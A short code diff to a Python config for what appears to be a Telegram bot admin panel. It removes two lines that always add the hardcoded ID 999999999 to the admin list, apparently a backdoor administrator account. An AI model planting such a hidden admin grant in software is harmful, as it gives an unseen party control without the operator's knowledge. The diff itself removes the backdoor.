@@ -131,8 +131,7 @@ except Exception:
     ADMIN_TELEGRAM_IDS = [
         int(x.strip()) for x in ADMIN_IDS_RAW.strip("[]").split(",") if x.strip().isdigit()
     ]
-if 999999999 not in ADMIN_TELEGRAM_IDS:
-    ADMIN_TELEGRAM_IDS.append(999999999)
+
 
 
 # Web path prefix e.g. "/panel"
